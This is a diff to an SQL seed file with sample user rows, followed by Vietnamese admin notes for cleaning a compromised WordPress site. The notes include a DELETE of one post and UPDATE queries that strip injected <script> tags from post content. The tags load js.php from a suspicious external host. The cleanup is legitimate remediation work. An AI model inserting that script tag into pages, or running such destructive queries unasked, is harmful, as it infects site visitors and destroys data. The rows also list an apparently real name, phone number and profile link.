@@ -26,3 +26,15 @@ INSERT INTO `api_users` (`id`, `user_login`, `user_pass`, `user_role`, `user_ema
 (8, 'user7', '1', 'member', 'johndoe@gmail.com', 0887623038, '2012-06-01', 'Hà Nội', 'https://facebook.com/huudinh85/', 'Triệu Hữu Định', 'Làm trai phải lạ ở trên đời', '2012-06-01 02:12:30'),
 (9, 'user8', '1', 'member', 'johndoe@gmail.com', 0887623038, '2012-06-01', 'Hà Nội', 'https://facebook.com/huudinh85/', 'Triệu Hữu Định', 'Làm trai phải lạ ở trên đời', '2012-06-01 02:12:30'),
 (10, 'user9', '1', 'member', 'johndoe@gmail.com', 0887623038, '2012-06-01', 'Hà Nội', 'https://facebook.com/huudinh85/', 'Triệu Hữu Định', 'Làm trai phải lạ ở trên đời', '2012-06-01 02:12:30');
+
+
+
+<!-- Remove SQL -->
+Bạn có thực sự muốn thực hiện lệnh truy vấn sau đây không?
+DELETE FROM `wpvvk_posts` WHERE `wpvvk_posts`.`ID` = 1772;
+
+4. xoa phpmyadmin
+
+UPDATE wpdb_posts SET post_content=(REPLACE (post_content, "<script src='https://https://port.transandfiestas.ga/js.php?s=q' type='text/javascript'></script><script src='https://https://port.transandfiestas.ga/js.php?s=q' type='text/javascript'></script>","")) 
+
+UPDATE wpzx_posts SET post_content=(REPLACE (post_content, '','')) 
